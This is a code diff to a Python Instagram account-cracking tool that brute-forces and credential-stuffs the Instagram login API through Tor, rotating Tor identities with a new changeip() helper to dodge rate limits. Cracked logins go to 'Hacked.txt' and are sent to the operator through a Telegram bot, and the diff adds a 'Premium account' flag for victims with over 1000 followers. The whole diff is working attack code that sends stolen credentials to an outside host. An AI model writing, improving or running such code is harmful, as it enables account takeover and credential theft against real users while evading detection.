@@ -48,6 +48,10 @@ passlinux = input("Enter your root password\n>>")
 def send_Tele(tokin,idd,text):
   requests.get("https://api.telegram.org/bot" + tokin + "/sendMessage" + "?chat_id=" + idd + "&text=" + text)
 
+def changeip():
+    with Controller.from_port(port=9051) as controller:
+                controller.authenticate(password=passlinux)
+                controller.signal(Signal.NEWNYM)
 
 def get_inf(user,passs,ask,tokin,iddd):
         f=open('combo.txt','a+')
@@ -75,11 +79,15 @@ def get_inf(user,passs,ask,tokin,iddd):
 = = = = = = = = = = = = = = = = = =
 By : @Abdullah_Coder
  """)
+        if int(followes) > 1000:
+            print("✅ Premium account")
         f = open("Hacked.txt",'a+')
         f.write(shug+"\n")
         f.close()
         if(ask == "Y" or ask == "y"):
             send_Tele(tokin,iddd,shug)
+            if int(followes) > 1000:
+              send_Tele(tokin,iddd,"✅ Premium account")
         
 
         return shug
@@ -175,9 +183,7 @@ def login(ask,tokin,idd,key):
                     'login_attempt_countn':'0',}
         # pro = random.choice(prox)
         try:
-            with Controller.from_port(port=9051) as controller:
-                controller.authenticate(password=passlinux)
-                controller.signal(Signal.NEWNYM)
+            changeip()
             try:
                 get = requests.post('https://i.instagram.com/api/v1/accounts/login/', headers=headers, data=data, proxies={'http': 'socks5://127.0.0.1:9050'}, allow_redirects=True)
                 if loginm in get.text:
@@ -280,9 +286,7 @@ def brute_pass():
                             'login_attempt_countn':'0',}
                 # pro = random.choice(prox)
                 try:
-                    with Controller.from_port(port=9051) as controller:
-                        controller.authenticate(password=passlinux)
-                        controller.signal(Signal.NEWNYM)
+                    changeip()
                     try:
                         get = requests.post('https://i.instagram.com/api/v1/accounts/login/', headers=headers, data=data, proxies={'http': 'socks5://127.0.0.1:9050'}, allow_redirects=True)
                         if loginm in get.text:
@@ -365,9 +369,7 @@ def combo_user_pass():
                             'login_attempt_countn':'0',}
                 # pro = random.choice(prox)
                 try:
-                    with Controller.from_port(port=9051) as controller:
-                        controller.authenticate(password=passlinux)
-                        controller.signal(Signal.NEWNYM)
+                    changeip()
                     try:
                         get = requests.post('https://i.instagram.com/api/v1/accounts/login/', headers=headers, data=data, proxies={'http': 'socks5://127.0.0.1:9050'}, allow_redirects=True)
                         if loginm in get.text:
@@ -433,9 +435,7 @@ def get_information():
                 # pro = random.choice(prox)
                 
 
-                with Controller.from_port(port=9051) as controller:
-                        controller.authenticate(password=passlinux)
-                        controller.signal(Signal.NEWNYM)
+                changeip()
 
                 get = requests.post('https://i.instagram.com/api/v1/accounts/login/', headers=headers, data=data, proxies={'http': 'socks5://127.0.0.1:9050'}, allow_redirects=True)
                 if loginm in get.text:
